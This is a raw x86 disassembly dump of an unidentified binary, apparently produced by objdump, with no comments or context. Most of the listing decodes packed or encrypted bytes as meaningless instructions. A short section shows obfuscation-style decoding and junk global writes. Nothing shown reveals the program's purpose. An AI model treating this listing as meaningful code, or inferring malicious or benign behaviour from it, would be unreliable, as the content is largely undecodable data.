  408abb:	jecxz  0x408b11
  408abd:	adc    ah,BYTE PTR [esi-0x5598e411]
  408ac3:	aam    0xb3
  408ac5:	test   al,0x90
  408ac7:	repnz pop edx
  408ac9:	lea    ebp,[ebx-0x7eeb3e31]
  408acf:	outs   dx,BYTE PTR ss:[esi]
  408ad1:	cwde   
  408ad2:	pushf  
  408ad3:	inc    edx
  408ad4:	push   ss
  408ad5:	pushf  
  408ad6:	fistp  DWORD PTR [esi+0x7f8665a5]
  408adc:	mov    edx,0xaa432b64
  408ae1:	test   DWORD PTR [ebx],esi
  408ae3:	jle    0x408a6c
  408ae5:	test   eax,0xc7888d31
  408aea:	into   
  408aeb:	adc    bh,BYTE PTR [edi+0x3b]
  408aee:	inc    edi
  408aef:	in     al,dx
  408af0:	sub    esp,ebx
  408af2:	inc    ebp
  408af3:	add    eax,0xcaf45f98
  408af8:	sub    al,dl
  408afa:	imul   ebx,ebp,0xfffffffd
  408afd:	cmp    ebx,ebx
  408aff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b00:	loopne 0x408b7c
  408b02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b03:	and    BYTE PTR [esi+ecx*8+0x4d],al
  408b07:	sete   BYTE PTR [ebx+0xde49d3b]
  408b0e:	mov    dh,0xa5
  408b10:	in     eax,dx
  408b11:	mov    esp,0x4c574961
  408b16:	scas   al,BYTE PTR es:[edi]
  408b17:	int3   
  408b18:	mov    bl,al
  408b1a:	int3   
  408b1b:	sub    BYTE PTR [edx-0x7e],ch
  408b1e:	adc    al,0x84
  408b20:	dec    esp
  408b21:	mov    eax,DWORD PTR [ebp+0x2a]
  408b24:	iret   
  408b25:	sbb    al,0x91
  408b27:	push   0xb484c445
  408b2c:	adc    ebp,edi
  408b2e:	loop   0x408b19
  408b30:	retf   0x7f8d
  408b33:	aaa    
  408b34:	or     ebp,DWORD PTR [edx]
  408b36:	xchg   ecx,eax
  408b37:	outs   dx,BYTE PTR ds:[esi]
  408b38:	mov    dh,0xe1
  408b3a:	das    
  408b3b:	fs xchg edx,eax
  408b3d:	push   esp
  408b3e:	dec    ebp
  408b3f:	jl     0x408b80
  408b41:	leave  
  408b42:	pop    ss
  408b43:	and    eax,0x43051eb7
  408b48:	mov    edi,0xbdec1af5
  408b4d:	pop    eax
  408b4e:	pop    ecx
  408b4f:	out    dx,al
  408b50:	mov    DWORD PTR [ebx+0x7c],eax
  408b53:	stos   DWORD PTR es:[edi],eax
  408b54:	cwde   
  408b55:	daa    
  408b56:	clc    
  408b57:	sbb    BYTE PTR [ecx],bl
  408b59:	or     al,0x8f
  408b5b:	imul   edi
  408b5d:	push   esp
  408b5e:	mov    ebx,DWORD PTR [ebp+0x74]
  408b61:	retf   
  408b62:	(bad)  
  408b63:	and    al,0x54
  408b65:	pop    eax
  408b66:	outs   dx,BYTE PTR ds:[esi]
  408b67:	xor    bl,BYTE PTR [eax]
  408b69:	mov    esp,0x4ddfb685
  408b6e:	push   ebp
  408b6f:	push   ss
  408b70:	loop   0x408be5
  408b72:	out    dx,al
  408b73:	call   0xd2cd:0xa5a0c1dc
  408b7a:	mov    gs,WORD PTR ds:0xb9c21907
  408b80:	or     eax,0xb583be52
  408b85:	ins    BYTE PTR es:[edi],dx
  408b86:	mov    ?,eax
  408b88:	leave  
  408b89:	sbb    BYTE PTR [ecx-0x3],dl
  408b8c:	icebp  
  408b8d:	mov    ch,0xea
  408b8f:	pop    eax
  408b90:	mov    eax,0x6d9aa9de
  408b95:	xor    esp,DWORD PTR [ecx]
  408b97:	(bad)  
  408b98:	nop
  408b99:	mov    eax,es:0xbc9a8fc8
  408b9f:	sahf   
  408ba0:	lods   eax,DWORD PTR ds:[esi]
  408ba1:	(bad)  
  408ba2:	xlat   BYTE PTR ds:[ebx]
  408ba3:	sti    
  408ba4:	push   cs
  408ba5:	and    al,0xbe
  408ba7:	fist   DWORD PTR [eax+0x2a3aefa3]
  408bad:	jne    0x408b43
  408baf:	data16 test al,0x55
  408bb2:	mov    ds,WORD PTR [eax+ebx*4+0x222e8a57]
  408bb9:	dec    ebx
  408bba:	aas    
  408bbb:	jnp    0x408bfd
  408bbd:	pop    es
  408bbe:	or     edx,esp
  408bc0:	out    0x9b,al
  408bc2:	std    
  408bc3:	hlt    
  408bc4:	je     0x408c02
  408bc6:	lock mov ecx,0x7510891
  408bcc:	or     DWORD PTR ds:0x43000c,0x42f01c
  408bd6:	xor    eax,ecx
  408bd8:	add    eax,0x3272d9
  408bdd:	mov    DWORD PTR [edx],eax
  408bdf:	mov    eax,ds:0x41c3cb
  408be4:	sub    DWORD PTR ds:0x42f01c,edi
  408bea:	mov    edx,DWORD PTR [ebp-0x4]
  408bed:	or     DWORD PTR ds:0x430000,0x42f000
  408bf7:	mov    eax,DWORD PTR [eax]
  408bf9:	add    eax,DWORD PTR [edx]
  408bfb:	sub    DWORD PTR ds:0x42e024,ecx
  408c01:	push   edi
  408c02:	adc    edi,0x4c74
  408c08:	mov    DWORD PTR [ebp-0x8],eax
  408c0b:	mov    edi,DWORD PTR [ebp+0x8]
  408c0e:	mov    eax,ds:0x41c553
  408c13:	adc    DWORD PTR ds:0x431008,0x4e87
  408c1d:	mov    eax,DWORD PTR [eax+0x198]
  408c23:	not    edx
  408c25:	xor    edi,ecx
  408c27:	mov    edx,0x3272d9
  408c2c:	sbb    DWORD PTR ds:0x42f008,0x42e010
  408c36:	add    edi,edx
  408c38:	cmp    DWORD PTR [eax],edi
  408c3a:	mov    DWORD PTR ds:0x43001c,0x5a6d
  408c44:	je     0x408c65
  408c4a:	mov    DWORD PTR ds:0x431014,0x6306
  408c54:	mov    eax,DWORD PTR [eax]
  408c56:	mov    DWORD PTR ds:0x42e00c,0x27f3
  408c60:	jmp    0x40b2eb
  408c65:	mov    eax,DWORD PTR [ebp+0x18]
  408c68:	mov    DWORD PTR ds:0x42e028,0x42df
  408c72:	cmp    eax,esi
  408c74:	jne    0x408c8e
  408c7a:	push   0xf89c85b9
  408c7f:	mov    DWORD PTR ds:0x43200c,0x1252
  408c89:	jmp    0x40b2da
  408c8e:	mov    DWORD PTR ds:0x430014,0x6280
  408c98:	mov    esi,DWORD PTR [ebp+0x18]
  408c9b:	mov    DWORD PTR ds:0x430014,edx
  408ca1:	mov    eax,0xf89c85b8
  408ca6:	mov    DWORD PTR ds:0x430018,0x1c86
  408cb0:	cmp    esi,eax
  408cb2:	mov    DWORD PTR ds:0x431000,0x72b7
  408cbc:	jne    0x40b2ca
  408cc2:	or     esi,0x43a1
  408cc8:	mov    eax,DWORD PTR [ebp+0x10]
  408ccb:	adc    esi,0x84b
  408cd1:	xor    eax,ecx
  408cd3:	add    eax,edx
  408cd5:	sbb    DWORD PTR ds:0x431008,ebx
  408cdb:	mov    DWORD PTR [ebp-0x18],eax
  408cde:	mov    esi,DWORD PTR ds:0x432018
  408ce4:	xor    DWORD PTR ds:0x430000,esi
  408cea:	mov    eax,DWORD PTR [ebp+0xc]
  408ced:	mov    esi,DWORD PTR [ebp-0x8]
  408cf0:	xor    DWORD PTR ds:0x432018,0x43000c
  408cfa:	xor    eax,ecx
  408cfc:	add    eax,edx
  408cfe:	imul   eax,DWORD PTR [esi]
  408d01:	mov    esi,DWORD PTR [ebp+0x8]
  408d04:	adc    DWORD PTR ds:0x431008,0x42e008
  408d0e:	xor    esi,ecx
  408d10:	xor    DWORD PTR ds:0x43000c,0x42e004
  408d1a:	add    esi,edx
  408d1c:	cmp    esi,eax
  408d1e:	mov    DWORD PTR ds:0x432004,ecx
  408d24:	mov    eax,DWORD PTR [ebp-0x4]
  408d27:	mov    DWORD PTR ds:0x42e024,0x5f80
  408d31:	push   ebx
  408d32:	mov    DWORD PTR ds:0x42e000,0x6cea
  408d3c:	je     0x40b125
  408d42:	jmp    0x40b090
  408d47:	pop    ss
  408d48:	xchg   esi,eax
  408d49:	dec    esp
  408d4a:	into   
  408d4b:	int    0x62
  408d4d:	xchg   ebx,eax
  408d4e:	lods   eax,DWORD PTR ds:[si]
  408d50:	scas   al,BYTE PTR es:[edi]
  408d51:	popf   
  408d52:	(bad)  
  408d54:	push   ds
  408d55:	xlat   BYTE PTR ds:[ebx]
  408d56:	push   ebx
  408d57:	pop    esp
  408d58:	push   ss
  408d59:	pusha  
  408d5a:	pusha  
  408d5b:	push   ecx
  408d5c:	pop    edi
  408d5d:	pusha  
  408d5e:	pusha  
  408d5f:	add    al,BYTE PTR [ebx]
  408d61:	pop    ecx
  408d62:	sbb    edx,DWORD PTR [edx+edi*4-0x32e4c86f]
  408d69:	ss das 
  408d6b:	hlt    
  408d6c:	push   edx
  408d6d:	push   0xffffffc4
  408d6f:	or     al,0x4a
  408d71:	(bad)  
  408d72:	pop    esp
  408d73:	xchg   ebx,eax
  408d74:	rcl    DWORD PTR cs:[eax-0x23],0x87
  408d79:	mov    esp,0x2081399a
  408d7e:	jno    0x408dd6
  408d80:	jb     0x408de6
  408d82:	mov    al,0x10
  408d84:	lock scas eax,DWORD PTR es:[edi]
  408d86:	xchg   esp,eax
  408d87:	(bad)  
  408d88:	pusha  
  408d89:	sbb    bl,bl
  408d8b:	xor    eax,0x9ca3151a
  408d90:	(bad)  
  408d91:	xchg   ebx,eax
  408d92:	movmskps ecx,xmm6
  408d95:	mov    ds,WORD PTR [edi+0x70]
  408d98:	ds mov cl,0x45
  408d9b:	das    
  408d9c:	push   0xdc6b4bf4
  408da1:	mov    esp,0x435d9f04
  408da6:	int    0xbe
  408da8:	pusha  
  408da9:	jo     0x408d2e
  408dab:	dec    ecx
  408dac:	add    eax,0x8334093f
  408db1:	jmp    0x974a:0x849649c9
  408db8:	ins    BYTE PTR es:[edi],dx
  408db9:	xchg   ecx,eax
  408dba:	adc    al,0x34
  408dbc:	imul   esi,ebx,0xd1ccc4ab
  408dc2:	cdq    
  408dc3:	lods   eax,DWORD PTR ds:[esi]
  408dc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408dc5:	mov    dl,0xb6
  408dc7:	xchg   edx,eax
  408dc8:	mov    esi,0xb568f22b
  408dcd:	int    0xe9
  408dcf:	loop   0x408d5a
  408dd1:	inc    esi
  408dd2:	inc    edi
  408dd3:	push   ecx
  408dd4:	stc    
  408dd5:	repz push 0x51
  408dd8:	jns    0x408e57
  408dda:	add    BYTE PTR [eax-0x52],dh
  408ddd:	sbb    al,0x88
  408ddf:	aad    0x99
  408de1:	push   0x534fc4e0
  408de6:	and    eax,DWORD PTR [ebp+0x13]
  408de9:	fistp  WORD PTR [ecx]
  408deb:	mov    dl,0x74
  408ded:	jmp    0x4427:0x38fec963
  408df4:	adc    eax,0xe7c3519d
  408df9:	lock mov ds:0xf29439e1,al
  408dff:	je     0x408dd9
  408e01:	sbb    cl,BYTE PTR [edi+0x4bf711c8]
  408e07:	scas   al,BYTE PTR es:[edi]
  408e08:	xlat   BYTE PTR ds:[ebx]
  408e09:	sbb    al,0xd7
  408e0b:	push   edi
  408e0c:	cmp    DWORD PTR [ebp+0x73c12ccb],0x4e981993
  408e16:	dec    edi
  408e17:	mov    bh,0x30
  408e19:	out    0xf2,al
  408e1b:	mov    al,ds:0xab96afd4
  408e20:	sbb    edx,DWORD PTR [edx+0x0]
  408e23:	into   
  408e24:	enter  0xc577,0xfd
  408e28:	dec    esp
  408e29:	sahf   
  408e2a:	das    
  408e2b:	or     al,0xe6
  408e2d:	test   eax,0x7288303
  408e32:	repz fdivr DWORD PTR [ecx]
  408e35:	add    dl,BYTE PTR [ecx-0x5f]
  408e38:	inc    ecx
  408e39:	fldcw  WORD PTR [ebx-0x4c]
  408e3c:	and    BYTE PTR [edx],ch
  408e3e:	div    DWORD PTR [edx+0xd]
  408e41:	sbb    eax,0x16dfc91
  408e46:	sar    BYTE PTR [ecx+esi*2-0x52ac8f54],1
  408e4d:	mov    edx,0x97943838
  408e52:	mov    bl,0xa
  408e54:	pop    es
  408e55:	dec    edi
  408e56:	sub    eax,0x1ab8ed97
  408e5b:	or     dh,BYTE PTR [esi+0x25]
  408e5e:	fdiv   QWORD PTR [esi-0x70]
  408e61:	retf   
  408e62:	pop    ebp
  408e63:	popf   
  408e64:	sbb    eax,0xb680ce6
  408e69:	stos   BYTE PTR es:[edi],al
  408e6a:	loopne 0x408e23
  408e6c:	mov    eax,ds:0x14c6231d
  408e71:	mov    ebp,0xddfd52e2
  408e76:	into   
  408e77:	hlt    
  408e78:	xchg   ebp,eax
  408e79:	popf   
  408e7a:	shl    BYTE PTR [esi-0x5d],1
  408e7d:	(bad)  
  408e7e:	(bad)  
  408e7f:	ja     0x408e31
  408e81:	jnp    0x408edb
  408e83:	(bad)  
  408e84:	jmp    0x67fa:0xc74e0593
  408e8b:	pop    ss
  408e8c:	aaa    
  408e8d:	imul   edx,DWORD PTR [ecx-0x10468969],0xffffff89
  408e94:	aaa    
  408e95:	pop    eax
  408e96:	jns    0x408e61
  408e98:	cmp    al,0xc5
  408e9a:	dec    edi
  408e9b:	sub    esp,DWORD PTR [ebx]
  408e9d:	(bad)  
  408e9e:	mov    DWORD PTR [edx-0x7c67118b],ebp
  408ea4:	xchg   edi,eax
  408ea5:	xchg   ebp,eax
  408ea6:	pop    ds
  408ea7:	ds jg  0x408ed0
  408eaa:	pop    ebp
  408eab:	mov    BYTE PTR [eax],cl
  408ead:	mov    dl,0x9b
  408eaf:	and    al,0x8b
  408eb1:	mov    ecx,0x1c7de797
  408eb6:	outs   dx,BYTE PTR ds:[esi]
  408eb7:	fsubr  DWORD PTR [ebx-0x4190221d]
  408ebd:	adc    DWORD PTR [eax-0x78d022c3],ebx
  408ec3:	sbb    al,cl
  408ec5:	inc    ecx
  408ec6:	(bad)  
  408ec7:	sar    BYTE PTR [edi],cl
  408ec9:	(bad)  
  408eca:	and    eax,0x6613aa2d
  408ecf:	add    ah,BYTE PTR [eax-0x72]
  408ed2:	sub    dl,cl
  408ed4:	mov    edx,0xbac5c1d9
  408ed9:	inc    ebx
  408eda:	dec    esi
  408edb:	inc    edi
  408edc:	arpl   di,dx
  408ede:	mov    ebx,0x1cfa18eb
  408ee3:	mov    esp,0x96afce8d
  408ee8:	lods   al,BYTE PTR ds:[esi]
  408ee9:	cmp    BYTE PTR [edx-0x6345d8fe],ah
  408eef:	retf   
  408ef0:	ja     0x408f45
  408ef2:	into   
  408ef3:	sbb    DWORD PTR [ecx],esp
  408ef5:	cmp    BYTE PTR [edi-0x79e91a76],al
  408efb:	xchg   ecx,eax
  408efc:	mov    WORD PTR [edi-0x3955bb16],ds
  408f02:	sub    cl,BYTE PTR [ecx+eiz*1-0x7f436b78]
  408f09:	or     eax,0x2cfc9a3f
  408f0e:	or     BYTE PTR [esi],ch
  408f10:	clc    
  408f11:	mov    ecx,DWORD PTR [eax-0xc]
  408f14:	mov    ds:0x4f5e8e8e,eax
  408f19:	sar    ah,cl
  408f1b:	outs   dx,DWORD PTR ds:[esi]
  408f1c:	push   ecx
  408f1d:	int    0xc9
  408f1f:	adc    BYTE PTR ds:0x9016cb9d,dl
  408f25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f26:	or     eax,edi
  408f28:	mov    esi,DWORD PTR [edi+0xc3d86d6]
  408f2e:	sbb    DWORD PTR [eax-0x3e4bc814],eax
  408f34:	fst    QWORD PTR [edi-0x36774197]
  408f3a:	jo     0x408fac
  408f3c:	popa   
  408f3d:	mov    al,0x11
  408f3f:	xor    ebp,DWORD PTR [esi+0x61]
  408f42:	mov    eax,ds:0xe37ed196
  408f47:	jbe    0x408f3d
  408f49:	sbb    al,0xdb
  408f4b:	xor    al,0x20
  408f4d:	test   al,0x21
  408f4f:	dec    edx
  408f50:	shl    BYTE PTR [ebp+0x2e],1
  408f53:	sub    DWORD PTR [edi+0x28],ebp
  408f56:	shl    DWORD PTR [edi],cl
  408f58:	dec    ecx
  408f59:	inc    ebx
  408f5a:	pop    edx
  408f5b:	iret   
  408f5c:	xor    esi,DWORD PTR [ecx]
  408f5e:	nop
  408f5f:	jae    0x408ef6
  408f61:	xchg   esi,eax
  408f62:	repnz inc eax
  408f64:	cmp    ah,0x4c
  408f67:	gs jns 0x408f94
  408f6a:	mov    ss,WORD PTR [esi+eax*1+0x6f]
  408f6e:	outs   dx,BYTE PTR ds:[esi]
  408f6f:	xchg   esi,edi
  408f71:	out    0x6,al
  408f73:	adc    al,0xb8
  408f75:	cld    
  408f76:	test   al,0xc0
  408f78:	pop    es
  408f79:	adc    al,0xb3
  408f7b:	xlat   BYTE PTR ds:[ebx]
  408f7c:	rcr    esi,cl
  408f7e:	loopne 0x408f74
  408f80:	cmp    cl,BYTE PTR [esi-0x2497396e]
  408f86:	(bad)  
  408f87:	xchg   ecx,eax
  408f88:	fadd   DWORD PTR [edx+esi*2+0x41]
  408f8c:	mov    ecx,0xa2f88c3b
  408f91:	aad    0x1a
  408f93:	dec    ebx
  408f94:	enter  0x8312,0xc9
  408f98:	sbb    DWORD PTR [eax+ebp*4],edi
  408f9b:	mov    bl,0xf
  408f9d:	sbb    dl,BYTE PTR [eax-0x34]
  408fa0:	or     DWORD PTR [esi+0x7cd1f81],esp
  408fa6:	xor    esp,esp
  408fa8:	pop    esp
  408fa9:	call   0x7b7599c9
  408fae:	fisttp QWORD PTR [edx-0x77adbc19]
  408fb4:	out    dx,al
  408fb5:	ret    
  408fb6:	jo     0x40900c
  408fb8:	cwde   
  408fb9:	pop    eax
  408fba:	cmc    
  408fbb:	ror    BYTE PTR [ebx-0x59],cl
  408fbe:	adc    eax,0x104f7130
  408fc3:	pop    ecx
  408fc4:	or     al,0xd4
  408fc6:	ja     0x408f8e
  408fc8:	fldcw  WORD PTR [ebx]
  408fca:	push   ss
  408fcb:	repnz add eax,0xe9351f0
  408fd1:	push   edx
  408fd2:	xor    ebp,ebp
  408fd4:	sub    al,0xe7
  408fd6:	cld    
  408fd7:	dec    ebx
  408fd8:	pop    ebx
  408fd9:	xchg   ecx,eax
  408fda:	mov    bl,0xa0
  408fdc:	(bad)  
  408fdd:	imul   edi,DWORD PTR [esi],0x1e2e163
  408fe3:	ror    DWORD PTR [ebx+0x21],0xb7
  408fe7:	mov    ah,0x10
  408fe9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fea:	mov    eax,ds:0x8d53fef2
  408fef:	xchg   esp,eax
  408ff0:	lods   eax,DWORD PTR ds:[esi]
  408ff1:	test   eax,0xd5fd92ca
  408ff6:	push   ebx
  408ff7:	in     eax,0xb5
  408ff9:	test   al,0x9b
  408ffb:	inc    eax
  408ffc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ffd:	cld    
  408ffe:	xchg   bl,bh
  409000:	adc    dh,BYTE PTR [eax-0x6b9edcf6]
  409006:	retf   
  409007:	push   ebp
  409008:	pop    ecx
  409009:	xchg   ebx,eax
  40900a:	(bad)  
  40900b:	ss adc al,ch
  40900e:	xlat   BYTE PTR ds:[ebx]
  40900f:	cli    
  409010:	fmul   QWORD PTR [ecx]
  409013:	xlat   BYTE PTR ds:[ebx]
  409014:	fsubr  DWORD PTR [ebp-0x20]
  409017:	hlt    
  409018:	jne    0x409035
  40901a:	push   ebx
  40901b:	adc    BYTE PTR [esi+eax*4+0x7894367e],bh
  409022:	test   al,0x9f
  409024:	fnsave [eax-0x66]
  409027:	popa   
  409028:	rcr    ecx,0xf8
  40902b:	push   ecx
  40902c:	ret    0xaca4
  40902f:	outs   dx,DWORD PTR ds:[esi]
  409030:	in     eax,0x81
  409032:	adc    DWORD PTR [ecx],ebx
  409034:	push   0xce83ef3a
  409039:	adc    al,0x75
  40903b:	and    eax,0x37a80180
  409040:	adc    DWORD PTR [ecx+0x4b],esi
  409043:	inc    edi
  409044:	stc    
  409045:	lea    ebp,[edi]
  409047:	xchg   ecx,eax
  409048:	or     eax,0xd63204ae
  40904d:	sub    eax,0x28d3ec5f
  409052:	pop    eax
  409053:	sti    
  409054:	out    dx,al
  409055:	xor    eax,0x5e57636f
  40905a:	retf   
  40905b:	xchg   esp,eax
  40905c:	dec    esi
  40905d:	mov    BYTE PTR [edx-0x78],cl
  409060:	out    dx,eax
  409061:	call   0x71fa68e3
  409066:	mov    bh,0x5e
  409068:	mov    bl,0x83
  40906a:	jo     0x4090a2
  40906c:	mov    ebx,0x8de26ed9
  409071:	pop    edi
  409072:	or     BYTE PTR [ecx-0x47512313],dh
  409078:	xor    DWORD PTR fs:[edi-0x5e73275f],ecx
  40907f:	(bad)  
  409080:	pop    ds
  409081:	mov    dx,0x3379
  409085:	xchg   BYTE PTR [edi],dl
  409087:	jmp    FWORD PTR ss:[esi+ebx*1]
  40908b:	(bad)  
  40908c:	pop    ebx
  40908d:	ins    BYTE PTR es:[edi],dx
  40908e:	push   0x39
  409090:	js     0x4090b4
  409092:	push   ebx
  409093:	mov    ebx,0x2d2c67d3
  409098:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40909a:	mov    ah,0x31
  40909c:	enter  0x77d0,0xd3
  4090a0:	dec    ebx
  4090a1:	cs xchg ebp,eax
  4090a3:	mov    dl,0x83
  4090a5:	pop    ebp
  4090a6:	xchg   edi,eax
  4090a7:	scas   eax,DWORD PTR es:[edi]
  4090a8:	outs   dx,DWORD PTR ds:[esi]
  4090a9:	cwde   
  4090aa:	cmp    bl,cl
  4090ac:	mov    eax,ds:0xf640edf2
  4090b1:	and    eax,0xf94d4cb4
  4090b6:	test   BYTE PTR [ebp-0x3],al
  4090b9:	mov    edx,0xae9a2e7b
  4090be:	inc    eax
  4090bf:	repz jmp 0x6b4c11dc
  4090c5:	mov    eax,0x5368ef6c
  4090ca:	out    0x39,eax
  4090cc:	std    
  4090cd:	add    eax,0x81b0c7d0
  4090d2:	int    0x32
  4090d4:	cmc    
  4090d5:	mov    ch,0xa1
  4090d7:	mov    bl,0x61
  4090d9:	fisttp QWORD PTR [ebp+0x61]
  4090dc:	ret    0xc23f
  4090df:	paddusw mm6,QWORD PTR [ebp+0x24be33a6]
  4090e6:	loop   0x409110
  4090e8:	push   ebx
  4090e9:	jno    0x4090ee
  4090eb:	lahf   
  4090ec:	mov    ds:0x5a9bac89,al
  4090f1:	jg     0x40908f
  4090f3:	push   ebp
  4090f4:	inc    edx
  4090f5:	inc    ecx
  4090f6:	add    ch,BYTE PTR [ecx+0x27]
  4090f9:	sbb    bh,BYTE PTR ds:0xfacd746b
  4090ff:	mov    ebx,ebx
  409101:	(bad)  
  409102:	jmp    FWORD PTR [eax+0x1]
  409105:	xchg   ebp,eax
  409106:	pop    esi
  409107:	mov    cs,WORD PTR [ebx-0x9]
  40910a:	pop    eax
  40910b:	je     0x409152
  40910d:	adc    esi,ebx
  40910f:	rcl    cl,cl
  409111:	pop    eax
  409112:	test   BYTE PTR [esi+0x19d3bd83],al
  409118:	inc    ecx
  409119:	pop    ebx
  40911a:	loopne 0x4090be
  40911c:	adc    edi,DWORD PTR [esi]
  40911e:	xchg   edi,eax
  40911f:	cmp    eax,0x1e7a8304
  409124:	mov    al,ds:0x5578ea6a
  409129:	push   ds
  40912a:	or     BYTE PTR [ecx-0x9],al
  40912d:	pop    ss
  40912e:	leave  
  40912f:	or     ebp,esp
  409131:	into   
  409132:	rol    BYTE PTR [edx+eax*4],1
  409135:	pop    es
  409136:	int3   
  409137:	ds sub eax,0x5b15284b
  40913d:	enter  0x37d5,0x81
  409141:	mov    ah,0xcf
  409143:	push   ecx
  409144:	and    eax,DWORD PTR [ebx-0x5]
  409147:	ins    BYTE PTR es:[edi],dx
  409148:	loopne 0x4090dd
  40914a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40914b:	mov    esi,0x5c214ee1
  409150:	cmp    esp,edx
  409152:	sub    ebx,ebp
  409154:	xor    dh,BYTE PTR [ebx]
  409156:	out    dx,eax
  409157:	inc    ecx
  409158:	push   ecx
  409159:	sub    eax,0xf34a54ae
  40915e:	jno    0x4091bf
  409160:	clc    
  409161:	xchg   esp,eax
  409162:	imul   esp,DWORD PTR [esi],0xc35428c1
  409168:	jp     0x4091a2
  40916a:	lahf   
  40916b:	out    0x1f,al
  40916d:	mov    ebx,0x6b764f01
  409172:	(bad)  
  409173:	or     dh,BYTE PTR es:[eax-0x2be67070]
  40917a:	sbb    ecx,DWORD PTR [esi-0x3aea32f]
  409180:	fstp   TBYTE PTR [ebx-0x7b8424cf]
  409186:	lock add bh,BYTE PTR [ecx-0x3ebacd0]
  40918d:	xchg   esp,eax
  40918f:	inc    edx
  409190:	xchg   ebx,eax
  409191:	sub    BYTE PTR [esp+eax*8],0xb8
  409195:	std    
  409196:	pop    esp
  409197:	mov    dl,0x7e
  409199:	scas   eax,DWORD PTR es:[edi]
  40919a:	sbb    DWORD PTR [ecx],esp
  40919c:	imul   esi,DWORD PTR [ebx-0x24006fd6],0x27443be3
  4091a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091a7:	test   al,0x6e
  4091a9:	cli    
  4091aa:	subps  xmm1,XMMWORD PTR [eax+edx*2-0x61]
  4091af:	xor    al,ah
  4091b1:	dec    edi
  4091b2:	dec    edx
  4091b3:	inc    ch
  4091b5:	push   es
  4091b6:	cs xchg ebp,eax
  4091b8:	mov    dl,0x50
  4091ba:	push   0xffffff84
  4091bc:	ja     0x40916b
  4091be:	fwait
  4091bf:	out    0xf9,eax
  4091c1:	stc    
  4091c2:	push   ebx
  4091c3:	inc    ebx
  4091c4:	jne    0x4091c9
  4091c6:	cmc    
  4091c7:	jne    0x4091cd
  4091c9:	je     0x40917b
  4091cb:	ficom  DWORD PTR [edi-0x16f423c6]
  4091d1:	retf   0x34eb
  4091d4:	pop    es
  4091d5:	lds    ebx,FWORD PTR [esi-0xa]
  4091d8:	sub    BYTE PTR [eax],dl
  4091da:	add    DWORD PTR [ebp+edx*1-0x7d],0xefd55577
  4091e2:	cs jl  0x40924f
  4091e5:	mov    DWORD PTR [esi],edi
  4091e7:	mov    edx,0xd966f814
  4091ec:	imul   ebx,DWORD PTR [edi+0xd],0xffffffe9
  4091f0:	jl     0x409205
  4091f2:	test   BYTE PTR [edi+0x60e2c8bf],dh
  4091f8:	daa    
  4091f9:	mov    ecx,0x48a17960
  4091fe:	aas    
  4091ff:	mov    ch,0x5e
  409201:	or     eax,0x3c93f5d4
  409206:	sub    BYTE PTR [ebp+esi*2+0x3c],ah
  40920a:	test   DWORD PTR ss:[eax+ebp*4],edx
  40920e:	je     0x409269
  409210:	shl    cl,1
  409212:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409213:	int    0xff
  409215:	fcom   DWORD PTR [ecx+edx*2-0x6182203e]
  40921c:	std    
  40921d:	fs loopne 0x40926d
  409220:	shl    BYTE PTR [eax],0xd9
  409223:	sbb    dl,BYTE PTR [ebp-0x1e]
  409226:	popa   
  409227:	clc    
  409228:	pop    fs
  40922a:	lock pop es
  40922c:	mov    cs,edi
  40922e:	cmp    DWORD PTR [edx+eiz*8],esp
  409231:	pop    edi
  409232:	jns    0x409244
  409234:	and    edi,DWORD PTR [edi-0x5d707b82]
  40923a:	dec    eax
  40923b:	xchg   edi,eax
  40923c:	ror    edx,1
  40923e:	pop    esi
  40923f:	jmp    ecx
  409241:	dec    esi
  409242:	popa   
  409243:	xor    ah,bh
  409245:	adc    al,0x51
  409247:	hlt    
  409248:	ror    BYTE PTR [edx-0x38319392],cl
  40924e:	scas   eax,DWORD PTR es:[edi]
  40924f:	mov    esp,0x5984f5d6
  409254:	add    edi,eax
  409256:	xlat   BYTE PTR ds:[ebx]
  409257:	push   edi
  409258:	ins    DWORD PTR es:[edi],dx
  409259:	das    
  40925a:	neg    ebp
  40925c:	mov    ds:0x76dd4619,al
  409261:	pop    eax
  409262:	and    ah,dh
  409264:	pushf  
  409265:	enterw 0xa722,0xa4
  40926a:	sbb    dh,BYTE PTR [esi+eax*8+0xf]
  40926e:	(bad)  
  40926f:	aad    0xa5
  409271:	sbb    edi,eax
  409273:	or     DWORD PTR [edi+0x66],ecx
  409276:	das    
  409277:	push   edi
  409278:	mov    esp,0xaed34fa6
  40927d:	dec    eax
  40927e:	xchg   esp,eax
  40927f:	add    edi,DWORD PTR [edi]
  409281:	mov    ds:0x4d55c758,eax
  409286:	(bad)  
  409287:	lds    ecx,FWORD PTR [ecx+0x4d]
  40928a:	jno    0x4092dd
  40928c:	daa    
  40928d:	push   esp
  40928e:	imul   ebp,DWORD PTR [edi-0x13],0xbb7134e
  409295:	(bad)  
  409297:	mov    ebx,0x41464c4c
  40929c:	mov    cl,0xee
  40929e:	or     eax,0x3e11fac5
  4092a3:	in     al,dx
  4092a4:	xor    al,0x1b
  4092a6:	dec    DWORD PTR [esi-0x6d6acf90]
  4092ac:	and    DWORD PTR [ebx],ecx
  4092ae:	sbb    DWORD PTR ds:0xfaebaddc,esi
  4092b4:	(bad)  
  4092b5:	adc    BYTE PTR [edx-0x5f3a8190],dh
  4092bb:	xor    bl,0x81
  4092be:	mov    eax,ds:0x6a60a4e3
  4092c3:	sbb    edi,DWORD PTR [esp+eax*8-0x33ed8f83]
  4092ca:	aas    
  4092cb:	test   eax,0xa77ddb59
  4092d0:	shl    DWORD PTR [ecx],0xf4
  4092d3:	jmp    0xf5b4:0xb51cdb25
  4092da:	add    BYTE PTR [esi],bh
  4092dc:	repnz xor al,dl
  4092df:	cmp    al,0x69
  4092e1:	xchg   edi,eax
  4092e2:	pusha  
  4092e3:	mov    ah,0x20
  4092e5:	loopne 0x409305
  4092e7:	loop   0x4092ec
  4092e9:	dec    esp
  4092ea:	and    eax,0x16d0d288
  4092ef:	and    al,0x9b
  4092f1:	xor    BYTE PTR [ebp+0x22],cl
  4092f4:	out    0xfe,al
  4092f6:	(bad)  
